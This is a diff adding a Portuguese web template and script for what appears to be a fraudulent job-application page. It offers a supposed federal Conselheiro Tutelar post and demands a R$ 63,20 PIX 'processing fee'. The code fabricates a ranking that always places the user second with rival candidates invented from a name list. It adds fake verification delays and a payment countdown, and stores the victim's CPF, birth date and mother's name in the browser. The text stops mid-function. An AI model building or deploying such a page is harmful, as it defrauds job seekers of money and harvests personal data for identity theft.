@@ -1,0 +1,907 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="max-w-2xl mx-auto px-4 py-6">
+    <!-- Institutional Header -->
+    <div class="text-center mb-4">
+        <div class="bg-slate-800 text-white rounded-lg p-4 mb-4 shadow-lg border border-slate-600 relative overflow-hidden">
+            <!-- Elegant accent -->
+            <div class="absolute top-0 left-1/2 transform -translate-x-1/2 w-20 h-0.5 bg-amber-400"></div>
+            
+            <div class="relative z-10">
+                <div class="inline-flex items-center justify-center w-12 h-12 bg-amber-400 rounded-full mb-3 shadow-md">
+                    <i class="fas fa-check-circle text-lg text-slate-800"></i>
+                </div>
+                <h1 class="text-xl font-light tracking-wider mb-2 text-slate-100">
+                    PROVA PRESENCIAL
+                </h1>
+                <div class="w-16 h-px bg-amber-400 mx-auto mb-2"></div>
+                <p class="text-base font-medium text-slate-200 mb-1">Agendamento Obrigatório</p>
+                <p class="text-xs text-slate-300 font-light">Avaliação por Banca Examinadora</p>
+                <div class="mt-3 px-3 py-1 bg-slate-700 rounded-full inline-block">
+                    <p class="text-xs text-amber-400 font-medium">PRÓXIMA ETAPA</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Success information -->
+    <div class="bg-white rounded-lg shadow-md border border-slate-200 p-4 mb-4">
+        <div class="text-center mb-4">
+            <div class="inline-flex items-center justify-center w-10 h-10 bg-blue-100 rounded-full mb-2">
+                <i class="fas fa-users text-base text-blue-600"></i>
+            </div>
+            <h2 class="text-lg font-light text-slate-800 mb-2">Avaliação Presencial</h2>
+            <p class="text-sm text-slate-600 leading-relaxed">
+                Selecione o <span class="font-medium text-green-600">local de prova</span> mais próximo de você. 
+                A prova será aplicada por uma <span class="font-medium text-amber-600">banca examinadora local</span> 
+                e deve ser agendada com antecedência.
+            </p>
+        </div>
+        
+        <!-- Next steps -->
+        <div class="bg-slate-50 rounded p-3 border border-slate-100 mb-4">
+            <h3 class="font-medium text-sm text-slate-800 mb-3 flex items-center">
+                <i class="fas fa-list-check text-green-600 mr-2 text-sm"></i>Próximos Passos
+            </h3>
+            <div class="space-y-2">
+                <div class="flex items-start">
+                    <div class="bg-green-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mr-2 mt-0.5">1</div>
+                    <div>
+                        <p class="font-medium text-xs">Convocação Oficial</p>
+                        <p class="text-slate-600 text-xs mt-0.5">Em até 15 dias úteis via e-mail e telefone</p>
+                    </div>
+                </div>
+                <div class="flex items-start">
+                    <div class="bg-green-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mr-2 mt-0.5">2</div>
+                    <div>
+                        <p class="font-medium text-xs">Documentação</p>
+                        <p class="text-slate-600 text-xs mt-0.5">Apresentação dos documentos originais</p>
+                    </div>
+                </div>
+                <div class="flex items-start">
+                    <div class="bg-green-600 text-white rounded-full w-5 h-5 flex items-center justify-center text-xs font-bold mr-2 mt-0.5">3</div>
+                    <div>
+                        <p class="font-medium text-xs">Início das Atividades</p>
+                        <p class="text-slate-600 text-xs mt-0.5">Auxílio de R$ 4.200 + R$ 800 alimentação</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Benefits reminder -->
+        <div class="bg-green-50 rounded p-3 border border-green-200">
+            <h4 class="font-medium text-sm text-slate-800 mb-2 flex items-center">
+                <i class="fas fa-gift text-green-600 mr-1 text-sm"></i>Benefícios Confirmados
+            </h4>
+            <div class="grid grid-cols-2 gap-3">
+                <div class="text-center p-2 bg-white rounded border border-green-200">
+                    <p class="text-lg font-bold text-green-600">R$ 4.200</p>
+                    <p class="text-slate-700 text-xs">Auxílio Mensal</p>
+                </div>
+                <div class="text-center p-2 bg-white rounded border border-green-200">
+                    <p class="text-lg font-bold text-green-600">R$ 800</p>
+                    <p class="text-slate-700 text-xs">Vale Alimentação</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- School Attendance Requirement -->
+    {% if nearby_schools and nearby_schools|length > 0 %}
+    <div class="bg-white rounded-lg shadow-md border border-slate-200 p-4 mb-4">
+        <div class="text-center mb-3">
+            <div class="inline-flex items-center justify-center w-10 h-10 bg-blue-100 rounded-full mb-2">
+                <i class="fas fa-school text-base text-blue-600"></i>
+            </div>
+            <h3 class="text-lg font-light text-slate-800 mb-1">Local de Prova</h3>
+            <div class="w-12 h-px bg-amber-400 mx-auto"></div>
+            <p class="text-xs text-slate-600 mt-2">Selecione o local de prova mais próximo da sua residência</p>
+        </div>
+        
+        <div class="bg-blue-50 rounded p-3 border border-blue-200 mb-3">
+            <h4 class="text-sm font-medium text-blue-800 mb-2">Formato da Prova</h4>
+            <ul class="text-xs text-blue-700 space-y-1">
+                <li>• Prova dissertativa sobre ECA</li>
+                <li>• Entrevista com banca examinadora</li>
+                <li>• Análise de casos práticos</li>
+                <li>• Duração: 3 horas</li>
+            </ul>
+        </div>
+        
+        <div class="space-y-3">
+            <h4 class="font-medium text-sm text-slate-800 mb-2 flex items-center">
+                <i class="fas fa-map-marker-alt text-blue-600 mr-2 text-sm"></i>Locais de Prova Próximos
+            </h4>
+            
+            {% for school in nearby_schools %}
+            <div class="bg-white rounded p-3 border border-slate-200 hover:bg-blue-50 transition-colors cursor-pointer school-option" 
+                 data-school-name="{{ school.name }}" 
+                 data-school-address="{{ school.address }}"
+                 data-school-distance="{{ school.distance }}">
+                <div class="flex justify-between items-start">
+                    <div class="flex-1">
+                        <div class="flex items-center mb-1">
+                            <input type="radio" name="school" value="{{ school.name }}" 
+                                   class="w-3 h-3 text-blue-600 mr-2" id="school_{{ loop.index0 }}">
+                            <label for="school_{{ loop.index0 }}" class="font-medium text-sm text-slate-800 cursor-pointer">{{ school.name }}</label>
+                        </div>
+                        <p class="text-xs text-slate-600 ml-5">{{ school.address }}</p>
+                        <div class="flex items-center mt-1 ml-5">
+                            <i class="fas fa-building text-xs text-slate-500 mr-1"></i>
+                            <span class="text-xs text-blue-600">Local de Prova</span>
+                        </div>
+                    </div>
+                    <div class="text-right">
+                        <span class="text-xs font-medium text-blue-600">{{ school.distance }}</span>
+                        <p class="text-xs text-slate-500">distância</p>
+                    </div>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+        
+        <!-- Scheduling Section -->
+        <div class="mt-4 bg-white rounded border border-slate-200 p-3">
+            <h4 class="font-medium text-sm text-slate-800 mb-3 flex items-center">
+                <i class="fas fa-calendar-alt text-blue-600 mr-2 text-sm"></i>Agendamento da Prova
+            </h4>
+            
+            <!-- Activity Check -->
+            <div class="bg-blue-50 rounded p-3 border border-blue-200 mb-3">
+                <h5 class="text-sm font-medium text-blue-800 mb-2">Situação Profissional</h5>
+                <p class="text-xs text-blue-700 mb-3">Você possui atualmente outro emprego ou atividade profissional?</p>
+                
+                <div class="flex gap-2">
+                    <button id="activity-no" class="bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-xs transition-colors">
+                        Não trabalho
+                    </button>
+                    <button id="activity-yes" class="bg-amber-600 hover:bg-amber-700 text-white px-3 py-1 rounded text-xs transition-colors">
+                        Já trabalho
+                    </button>
+                </div>
+                
+                <div id="employment-note" class="mt-2 p-2 bg-amber-100 rounded text-xs text-amber-800" style="display: none;">
+                    <i class="fas fa-info-circle mr-1"></i>
+                    Candidatos com emprego atual terão mais opções de horário para compatibilizar com a atividade profissional.
+                </div>
+            </div>
+
+            <!-- Schedule Options -->
+            <div id="schedule-options" class="bg-amber-50 rounded p-3 border border-amber-200" style="display: none;">
+                <h5 class="text-sm font-medium text-amber-800 mb-2">Horários de Prova Disponíveis</h5>
+                <p class="text-xs text-amber-700 mb-2">Selecione o melhor horário para sua prova presencial:</p>
+                <div id="date-list" class="space-y-2 max-h-40 overflow-y-auto">
+                    <!-- Dates will be populated by JavaScript -->
+                </div>
+            </div>
+
+            <!-- Checking Message -->
+            <div id="checking-message" class="bg-slate-50 rounded p-3 border border-slate-200" style="display: none;">
+                <div class="flex items-center">
+                    <i class="fas fa-search text-slate-600 mr-2"></i>
+                    <p class="text-sm text-slate-700">Verificando horários compatíveis com sua atividade profissional...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Required documents -->
+        <div class="mt-3 bg-green-50 rounded p-3 border border-green-200">
+            <div class="flex items-start">
+                <i class="fas fa-clipboard-list text-green-600 mr-2 text-sm mt-0.5"></i>
+                <div>
+                    <p class="text-xs font-medium text-green-800 mb-1">Documentos Obrigatórios:</p>
+                    <ul class="text-xs text-green-700 space-y-0.5">
+                        <li>• RG e CPF originais</li>
+                        <li>• Comprovante de inscrição</li>
+                        <li>• Caneta azul ou preta</li>
+                        <li>• Chegada 30 min antes</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- Scheduling section -->
+        <div class="mt-4 bg-white rounded border border-slate-200 p-3" id="scheduling-section" style="display: none;">
+            <h4 class="font-medium text-sm text-slate-800 mb-3 flex items-center">
+                <i class="fas fa-calendar-alt text-blue-600 mr-2 text-sm"></i>Agendamento Obrigatório
+            </h4>
+            
+            <div class="space-y-3">
+                <div>
+                    <label class="block text-xs font-medium text-slate-700 mb-1">Você possui outra atividade profissional?</label>
+                    <div class="flex gap-4">
+                        <label class="flex items-center">
+                            <input type="radio" name="has_other_activity" value="sim" class="mr-1 text-amber-600">
+                            <span class="text-xs text-slate-700">Sim</span>
+                        </label>
+                        <label class="flex items-center">
+                            <input type="radio" name="has_other_activity" value="nao" class="mr-1 text-amber-600">
+                            <span class="text-xs text-slate-700">Não</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div id="activity-details" style="display: none;">
+                    <label class="block text-xs font-medium text-slate-700 mb-1">Precisa de prazo adicional para habilitação?</label>
+                    <div class="flex gap-4">
+                        <label class="flex items-center">
+                            <input type="radio" name="needs_extra_time" value="sim" class="mr-1 text-amber-600">
+                            <span class="text-xs text-slate-700">Sim (até 7 dias)</span>
+                        </label>
+                        <label class="flex items-center">
+                            <input type="radio" name="needs_extra_time" value="nao" class="mr-1 text-amber-600">
+                            <span class="text-xs text-slate-700">Não, início imediato</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-medium text-slate-700 mb-1">Selecione a data de comparecimento:</label>
+                    <input type="date" name="attendance_date" class="w-full px-2 py-1 text-xs border border-slate-300 rounded" 
+                           min="" max="" id="attendance-date">
+                </div>
+
+                <div class="bg-blue-50 rounded p-2 border border-blue-200">
+                    <p class="text-xs text-slate-700">
+                        <span class="font-medium text-blue-800">Cargo Federal:</span> 
+                        Você será lotado no próprio município. A taxa paga é referente ao processo seletivo. 
+                        No dia selecionado, haverá <span class="font-medium">fardamento oficial</span> e 
+                        <span class="font-medium">reconhecimento da população</span> ao novo Conselheiro Tutelar.
+                    </p>
+                </div>
+
+                <button type="button" id="confirm-schedule" 
+                        class="w-full bg-slate-800 hover:bg-slate-700 text-white py-2 px-4 rounded text-sm font-medium transition-all duration-300 shadow-md hover:shadow-lg transform hover:-translate-y-0.5">
+                    <i class="fas fa-check mr-2 text-amber-400"></i>Confirmar Agendamento
+                </button>
+            </div>
+        </div>
+    </div>
+    {% else %}
+    <!-- Fallback school section if no schools are found -->
+    <div class="bg-white rounded-lg shadow-md border border-slate-200 p-4 mb-4">
+        <div class="text-center mb-3">
+            <div class="inline-flex items-center justify-center w-10 h-10 bg-blue-100 rounded-full mb-2">
+                <i class="fas fa-school text-base text-blue-600"></i>
+            </div>
+            <h3 class="text-lg font-light text-slate-800 mb-1">Comparecimento Obrigatório</h3>
+            <div class="w-12 h-px bg-amber-400 mx-auto"></div>
+        </div>
+        
+        <div class="bg-blue-50 rounded p-3 border border-blue-200 mb-3">
+            <p class="text-sm text-slate-700 text-center font-light">
+                Para <span class="font-medium text-slate-800">retirada dos materiais oficiais</span> e 
+                <span class="font-medium text-blue-600">início das atividades</span>, é obrigatório 
+                comparecer à <span class="font-medium text-slate-800">escola municipal mais próxima</span> 
+                em até <span class="font-medium text-blue-600">3 dias úteis</span> após o pagamento da taxa CNV.
+            </p>
+        </div>
+        
+        <div class="bg-green-50 rounded p-3 border border-green-200 mb-3">
+            <div class="flex items-start">
+                <i class="fas fa-box text-green-600 mr-2 text-sm mt-0.5"></i>
+                <div>
+                    <p class="text-xs font-medium text-slate-800 mb-1">Materiais a Retirar:</p>
+                    <ul class="text-xs text-slate-600 space-y-0.5">
+                        <li>• <span class="font-medium">Farda oficial</span> do Conselheiro Tutelar</li>
+                        <li>• <span class="font-medium">Carteira personalizada</span> com identificação</li>
+                        <li>• <span class="font-medium">Contrato de honra</span> para assinatura</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="bg-amber-50 rounded p-3 border border-amber-200">
+            <div class="flex items-start">
+                <i class="fas fa-info-circle text-amber-600 mr-2 text-sm mt-0.5"></i>
+                <div>
+                    <p class="text-xs font-medium text-slate-800 mb-1">Informações Importantes:</p>
+                    <ul class="text-xs text-slate-600 space-y-0.5">
+                        <li>• <span class="font-medium">Cargo Federal</span> - lotação no próprio município</li>
+                        <li>• Horário: 8h às 17h (dias úteis)</li>
+                        <li>• <span class="font-medium">Reconhecimento público</span> no dia do fardamento</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    {% endif %}
+
+    <!-- Process Status -->
+    <div class="bg-white rounded-lg shadow-md border border-slate-200 p-4 mb-4">
+        <h3 class="text-lg font-light text-slate-800 mb-3 text-center">
+            <i class="fas fa-clock text-amber-600 mr-2"></i>Pendências do Processo
+        </h3>
+        
+        <div class="bg-amber-50 rounded p-3 border border-amber-200 mb-3">
+            <div class="text-center">
+                <h4 class="text-sm font-medium text-amber-800 mb-2">Taxa Processual Pendente</h4>
+                <p class="text-lg font-bold text-amber-900">R$ 63,20</p>
+                <p class="text-xs text-amber-700">Documento de Arrecadação Municipal - DAM</p>
+            </div>
+        </div>
+
+        <div class="bg-blue-50 rounded p-3 border border-blue-200 mb-3">
+            <p class="text-sm text-blue-800 text-center">
+                Para prosseguir com o agendamento da prova presencial, é necessário 
+                <span class="font-medium">quitar a taxa processual</span> no valor de R$ 63,20.
+            </p>
+        </div>
+        
+        <div class="text-center mt-4">
+            <button id="proceed-exam" class="inline-block bg-slate-800 hover:bg-slate-700 text-white py-3 px-6 rounded-lg font-medium text-sm transition-all duration-300 shadow-md hover:shadow-lg transform hover:-translate-y-0.5 disabled:opacity-50 disabled:cursor-not-allowed" disabled>
+                <i class="fas fa-credit-card mr-2 text-amber-400"></i>Agendar e Prosseguir
+            </button>
+            <p id="proceed-status" class="text-slate-500 text-xs mt-2">Selecione uma escola e data primeiro</p>
+        </div>
+    </div>
+</div>
+
+
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // State vacancy mapping
+        const stateVacancies = {
+            'AC': 5, 'AL': 6, 'AP': 4, 'AM': 8, 'BA': 15, 'CE': 10, 'DF': 7, 'ES': 6,
+            'GO': 9, 'MA': 8, 'MT': 7, 'MS': 6, 'MG': 20, 'PA': 8, 'PB': 5, 'PR': 25,
+            'PE': 10, 'PI': 5, 'RJ': 30, 'RN': 6, 'RS': 20, 'RO': 5, 'RR': 4, 'SC': 12,
+            'SP': 50, 'SE': 5, 'TO': 5
+        };
+
+        // State name mapping for display
+        const stateNames = {
+            'AC': 'Acre', 'AL': 'Alagoas', 'AP': 'Amapá', 'AM': 'Amazonas', 'BA': 'Bahia', 
+            'CE': 'Ceará', 'DF': 'Distrito Federal', 'ES': 'Espírito Santo', 'GO': 'Goiás', 
+            'MA': 'Maranhão', 'MT': 'Mato Grosso', 'MS': 'Mato Grosso do Sul', 'MG': 'Minas Gerais', 
+            'PA': 'Pará', 'PB': 'Paraíba', 'PR': 'Paraná', 'PE': 'Pernambuco', 'PI': 'Piauí', 
+            'RJ': 'Rio de Janeiro', 'RN': 'Rio Grande do Norte', 'RS': 'Rio Grande do Sul', 
+            'RO': 'Rondônia', 'RR': 'Roraima', 'SC': 'Santa Catarina', 'SP': 'São Paulo', 
+            'SE': 'Sergipe', 'TO': 'Tocantins'
+        };
+
+        // Male names for generating candidates
+        const maleNames = [
+            'CARLOS EDUARDO SILVA', 'JOÃO PAULO SANTOS', 'MARCOS ANTONIO LIMA', 'RAFAEL HENRIQUE COSTA',
+            'ANDRÉ LUIZ FERREIRA', 'PEDRO HENRIQUE OLIVEIRA', 'LUCAS GABRIEL SOUZA', 'FELIPE AUGUSTO ALVES',
+            'RICARDO ALEXANDRE PEREIRA', 'GUILHERME FERNANDO ROCHA', 'BRUNO CESAR MARTINS', 'DANIEL ROBERTO ALMEIDA',
+            'RODRIGO ALEXANDRE BARBOSA', 'MATHEUS EDUARDO CARDOSO', 'LEANDRO CARLOS MOREIRA', 'FABIO HENRIQUE DIAS',
+            'THIAGO AUGUSTO GOMES', 'GUSTAVO FERNANDO RIBEIRO', 'VICTOR HUGO NASCIMENTO', 'WELLINGTON JOSE ARAUJO',
+            'SERGIO ANTONIO MACHADO', 'MARCELO LUIS RAMOS', 'FRANCISCO CARLOS MONTEIRO', 'EDSON ROBERTO TEIXEIRA',
+            'NELSON FERNANDO CORREIA', 'ANTONIO CARLOS FREITAS', 'JEFFERSON LUIS BATISTA', 'ALESSANDRO MARCOS XAVIER',
+            'RENATO AUGUSTO CAMPOS', 'CLAYTON JOSE VIEIRA', 'WAGNER HENRIQUE LOPES', 'RONALDO CESAR PINTO',
+            'EVERTON LUIS MORAES', 'ANDERSON CARLOS TORRES', 'VALMIR JOSE CAVALCANTE', 'SIDNEI ROBERTO CUNHA',
+            'EDVALDO ANTONIO MENDES', 'GILBERTO CARLOS FARIAS', 'ADENILSON JOSE BARROS', 'VANDERLEI LUIS TOLEDO',
+            'GERALDO ANTONIO CALDEIRA', 'SEBASTIAO CARLOS REZENDE', 'ADEMIR JOSE EVANGELISTA', 'VALDEMIR LUIS BRANDAO',
+            'OSMAR ROBERTO DOMINGUES', 'WASHINGTON CARLOS SIQUEIRA', 'NIVALDO JOSE MACIEL', 'VALDECI ANTONIO GODOY',
+            'BENEDITO CARLOS PESSOA', 'APARECIDO JOSE FERRAZ', 'VALDIVINO LUIS SAMPAIO'
+        ];
+
+        let selectedSchool = null;
+        let selectedDate = null;
+        let hasActivity = null;
+
+        // School selection handler
+        document.querySelectorAll('input[name="school"]').forEach(radio => {
+            radio.addEventListener('change', function() {
+                selectedSchool = this.value;
+                updateUI();
+                checkProceedButton();
+            });
+        });
+
+        // Activity buttons
+        document.getElementById('activity-no').addEventListener('click', function() {
+            hasActivity = false;
+            showScheduleOptions(7); // 7 days available
+            this.classList.add('bg-green-700');
+            document.getElementById('activity-yes').classList.remove('bg-amber-700');
+            document.getElementById('employment-note').style.display = 'none';
+        });
+
+        document.getElementById('activity-yes').addEventListener('click', function() {
+            hasActivity = true;
+            document.getElementById('employment-note').style.display = 'block';
+            showCheckingMessage();
+            this.classList.add('bg-amber-700');
+            document.getElementById('activity-no').classList.remove('bg-green-700');
+            
+            // Show checking message for 2 seconds, then show extended options
+            setTimeout(() => {
+                hideCheckingMessage();
+                showScheduleOptions(12); // 12 days available (7 + 5 extra)
+            }, 2000);
+        });
+
+        // Show checking message
+        function showCheckingMessage() {
+            document.getElementById('checking-message').style.display = 'block';
+            document.getElementById('schedule-options').style.display = 'none';
+            
+            // Update checking message for employment context
+            const checkingMsg = document.querySelector('#checking-message p');
+            checkingMsg.textContent = 'Verificando horários compatíveis com sua atividade profissional...';
+        }
+
+        // Hide checking message
+        function hideCheckingMessage() {
+            document.getElementById('checking-message').style.display = 'none';
+        }
+
+        // Show schedule options
+        function showScheduleOptions(days) {
+            const dateList = document.getElementById('date-list');
+            dateList.innerHTML = '';
+            
+            const today = new Date();
+            for (let i = 1; i <= days; i++) {
+                const date = new Date(today);
+                date.setDate(today.getDate() + i);
+                
+                const dateStr = date.toLocaleDateString('pt-BR');
+                const timeSlots = ['09:00', '14:00', '16:00'];
+                
+                timeSlots.forEach(time => {
+                    const option = document.createElement('div');
+                    option.className = 'flex items-center justify-between p-2 border border-slate-200 rounded hover:bg-slate-50 cursor-pointer';
+                    option.innerHTML = `
+                        <span class="text-sm text-slate-700">${dateStr} às ${time}</span>
+                        <input type="radio" name="exam-date" value="${dateStr}-${time}" class="text-blue-600">
+                    `;
+                    
+                    option.addEventListener('click', function() {
+                        const radio = option.querySelector('input[type="radio"]');
+                        radio.checked = true;
+                        selectedDate = radio.value;
+                        
+                        // Update visual feedback
+                        document.querySelectorAll('#date-list > div').forEach(div => {
+                            div.classList.remove('bg-blue-50', 'border-blue-400');
+                            div.classList.add('border-slate-200');
+                        });
+                        option.classList.add('bg-blue-50', 'border-blue-400');
+                        option.classList.remove('border-slate-200');
+                        
+                        checkProceedButton();
+                    });
+                    
+                    dateList.appendChild(option);
+                });
+            }
+            
+            document.getElementById('schedule-options').style.display = 'block';
+        }
+
+        // Update UI based on selection
+        function updateUI() {
+            document.querySelectorAll('.school-option').forEach(div => {
+                const radio = div.querySelector('input[type="radio"]');
+                if (radio.checked) {
+                    div.classList.add('border-blue-400', 'bg-blue-50');
+                    div.classList.remove('border-slate-200', 'bg-white');
+                } else {
+                    div.classList.remove('border-blue-400', 'bg-blue-50');
+                    div.classList.add('border-slate-200', 'bg-white');
+                }
+            });
+        }
+
+        // Check if proceed button should be enabled
+        function checkProceedButton() {
+            const proceedBtn = document.getElementById('proceed-exam');
+            const statusText = document.getElementById('proceed-status');
+            
+            if (selectedSchool && selectedDate) {
+                proceedBtn.disabled = false;
+                statusText.textContent = 'Confirmar agendamento';
+                proceedBtn.onclick = function() {
+                    confirmScheduling();
+                };
+            } else {
+                proceedBtn.disabled = true;
+                statusText.textContent = 'Selecione uma escola e data primeiro';
+            }
+        }
+
+        // Confirm scheduling and show next steps
+        function confirmScheduling() {
+            // Store selected data in session
+            fetch('/store-exam-selection', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    school: selectedSchool,
+                    date: selectedDate
+                })
+            }).then(() => {
+                // Show confirmation message
+                showSchedulingConfirmation();
+            });
+        }
+
+        // Show scheduling confirmation and next steps
+        function showSchedulingConfirmation() {
+            const container = document.querySelector('.max-w-2xl');
+            
+            // Create confirmation overlay
+            const overlay = document.createElement('div');
+            overlay.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
+            overlay.innerHTML = `
+                <div class="bg-white rounded-lg p-6 mx-4 max-w-md w-full shadow-xl">
+                    <div class="text-center mb-4">
+                        <div class="inline-flex items-center justify-center w-12 h-12 bg-green-100 rounded-full mb-3">
+                            <i class="fas fa-check text-green-600 text-lg"></i>
+                        </div>
+                        <h3 class="text-lg font-medium text-slate-800">Agendamento Confirmado!</h3>
+                    </div>
+                    
+                    <div class="bg-green-50 rounded p-3 border border-green-200 mb-4">
+                        <p class="text-sm text-green-800 text-center">
+                            <strong>Local:</strong> ${selectedSchool}<br>
+                            <strong>Data/Horário:</strong> ${selectedDate.replace('-', ' às ')}
+                        </p>
+                    </div>
+                    
+                    <div class="bg-amber-50 rounded p-3 border border-amber-200 mb-4">
+                        <p class="text-sm text-amber-800 text-center">
+                            <i class="fas fa-exclamation-triangle mr-1"></i>
+                            <strong>Pendência:</strong> Taxa processual de R$ 63,20 deve ser quitada para confirmação definitiva.
+                        </p>
+                    </div>
+                    
+                    <div class="text-center">
+                        <button onclick="proceedToPayment()" class="bg-slate-800 hover:bg-slate-700 text-white px-6 py-2 rounded-lg font-medium text-sm transition-colors">
+                            <i class="fas fa-credit-card mr-2"></i>Prosseguir para Pagamento
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(overlay);
+        }
+
+        // Proceed to payment page
+        window.proceedToPayment = function() {
+            window.location.href = '/pagamento';
+        };
+
+        // Generate ranking based on user's state
+        function generateRanking() {
+            const userState = localStorage.getItem('candidateState') || 'SP';
+            const userCity = localStorage.getItem('candidateCity') || 'São Paulo'; 
+            const userName = localStorage.getItem('candidateName') || localStorage.getItem('full_name') || 'CANDIDATO USUARIO';
+            
+            console.log('Debug - User state:', userState, 'User city:', userCity, 'User name:', userName);
+            
+            // Display user city and state name
+            const stateName = stateNames[userState] || userState;
+            document.getElementById('user-city-display').textContent = `${userCity} - ${stateName}`;
+            
+            // Get number of vacancies for user's state
+            const vacancies = stateVacancies[userState] || 10;
+            
+            // Generate candidates
+            const candidates = [];
+            const shuffledNames = [...maleNames].sort(() => Math.random() - 0.5);
+            
+            for (let i = 0; i < vacancies; i++) {
+                if (i === 1) {
+                    // User is in 2nd place with score 18
+                    candidates.push({
+                        name: userName.toUpperCase(),
+                        score: 18,
+                        isUser: true
+                    });
+                } else {
+                    candidates.push({
+                        name: shuffledNames[i] || `CANDIDATO ${i + 1}`,
+                        score: i === 0 ? 19 : (i < 5 ? Math.floor(Math.random() * 3) + 15 : Math.floor(Math.random() * 5) + 10),
+                        isUser: false
+                    });
+                }
+            }
+            
+            // Sort by score descending
+            candidates.sort((a, b) => b.score - a.score);
+            
+            // Populate table
+            const tableBody = document.getElementById('ranking-table-body');
+            tableBody.innerHTML = '';
+            
+            // Store all candidate names in localStorage
+            const candidateNames = candidates.map(candidate => candidate.name);
+            localStorage.setItem('rankingCandidates', JSON.stringify(candidateNames));
+            
+            candidates.forEach((candidate, index) => {
+                const row = document.createElement('tr');
+                const position = index + 1;
+                
+                if (candidate.isUser) {
+                    row.className = 'bg-green-50 border-green-200';
+                }
+                
+                row.innerHTML = `
+                    <td class="border border-gray-300 px-1 py-2 font-bold text-center w-12">${position}º</td>
+                    <td class="border border-gray-300 px-6 py-2 ${candidate.isUser ? 'font-bold text-green-700' : ''}">${candidate.name}</td>
+                    <td class="border border-gray-300 px-1 py-2 text-center font-bold w-16">${candidate.score}/20</td>
+                `;
+                
+                tableBody.appendChild(row);
+            });
+        }
+
+        // Generate ranking immediately
+        generateRanking();
+
+        // Get user data and regenerate ranking with correct name
+        fetch('/get_user_data')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('text-overlay-name').textContent = (data.full_name || '').toUpperCase();
+                document.getElementById('text-overlay-cpf').textContent = (data.cpf || '').toUpperCase();
+                
+                // Store complete user data in localStorage
+                if (data.full_name) {
+                    localStorage.setItem('candidateName', data.full_name);
+                }
+                if (data.cpf) {
+                    localStorage.setItem('candidateCPF', data.cpf);
+                }
+                if (data.birth_date) {
+                    localStorage.setItem('candidateBirthDate', data.birth_date);
+                }
+                if (data.mother_name) {
+                    localStorage.setItem('candidateMotherName', data.mother_name);
+                }
+                
+                // Also store the complete user data object
+                localStorage.setItem('userData', JSON.stringify(data));
+                
+                // Regenerate ranking with correct name
+                if (data.full_name) {
+                    generateRanking();
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Fallback: try to get name from localStorage
+                const storedName = localStorage.getItem('candidateName');
+                if (storedName && storedName !== 'CANDIDATO USUARIO') {
+                    generateRanking();
+                }
+            });
+        const payButton = document.querySelector('.animate-left-right');
+        const paymentPopup = document.getElementById('paymentPopup');
+
+        function openPaymentPopup() {
+            paymentPopup.style.display = 'flex';
+            startCountdown();
+        }
+
+        if (payButton) {
+            payButton.addEventListener('click', openPaymentPopup);
+        }
+    });
+
+    function startCountdown() {
+        let minutes = 10;
+        let seconds = 0;
+        const countdownEl = document.getElementById('countdown');
+        const interval = setInterval(() => {
+            if (seconds === 0) {
+                if (minutes === 0) {
+                    clearInterval(interval);
+                    countdownEl.classList.add('text-red-800');
+                    return;
+                }
+                minutes--;
+                seconds = 59;
+            } else {
+                seconds--;
+            }
+            const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
+            const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
+            countdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+            if (minutes === 0 && seconds <= 30) {
+                countdownEl.classList.add('animate-pulse');
+            }
+        }, 1000);
+    }
+
+    function generatePixPayment() {
+        const initialContent = document.getElementById('initialContent');
+        const loadingContent = document.getElementById('loadingContent');
+        const paymentContent = document.getElementById('paymentContent');
+
+        // Show loading
+        initialContent.style.display = 'none';
+        loadingContent.style.display = 'block';
+        paymentContent.style.display = 'none';
+
+        // Call API to generate PIX payment
+        fetch('/create_pix_payment', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                const paymentData = data.payment_data;
+
+                // Update payment content
+                document.getElementById('pixQrCode').src = paymentData.qrCodeBase64;
+                document.getElementById('pixCode').value = paymentData.pixCode;
+
+                // Start checking payment status
+                const transactionId = paymentData.id;
+                const statusCheckInterval = setInterval(() => {
+                    checkPaymentStatus(transactionId);
+                }, 5000); // Check every 5 seconds
+
+                // Stop checking after 10 minutes
+                setTimeout(() => {
+                    clearInterval(statusCheckInterval);
+                }, 600000);
+
+                // Fill user data and show payment content
+                fetch('/get_user_data')
+                    .then(response => response.json())
+                    .then(userData => {
+                        document.getElementById('devedorNome').textContent = userData.full_name;
+                        document.getElementById('devedorCpf').textContent = userData.cpf;
+                    });
+
+                // Show payment content
+                loadingContent.style.display = 'none';
+                paymentContent.style.display = 'block';
+
+                // Start countdown
+                startPaymentCountdown();
+            } else {
+                alert('Erro ao gerar pagamento: ' + data.error);
+                initialContent.style.display = 'block';
+                loadingContent.style.display = 'none';
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Erro ao gerar pagamento. Tente novamente.');
+            initialContent.style.display = 'block';
+            loadingContent.style.display = 'none';
+        });
+    }
+
+    function checkPaymentStatus(transactionId) {
+        // Check if we're in development environment (replit.dev)
+        const isDevelopment = window.location.hostname.includes('replit.dev');
+
+        if (isDevelopment) {
+            // In development, simulate payment completion after 5 seconds
+            setTimeout(() => {
+                window.location.href = `/resultado/PAID`;
+            }, 5000);
+            return;
+        }
+
